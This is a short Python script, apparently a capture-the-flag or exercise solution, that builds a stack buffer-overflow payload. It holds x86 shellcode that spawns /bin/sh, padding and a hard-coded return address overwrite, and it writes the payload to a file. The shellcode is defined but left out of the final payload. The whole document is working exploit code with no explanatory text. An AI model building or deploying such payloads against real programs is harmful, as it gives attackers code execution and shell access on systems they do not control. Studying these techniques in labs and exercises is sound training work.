shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
return_address = b"\xab\x85\x04\x08" #  0x80485ab
fill = b"0"*5*4
name = b"Sai\n"

payload = name + fill + return_address
print (payload)
f = open("exploit.exp", "wb")
f.write(payload)
f.close()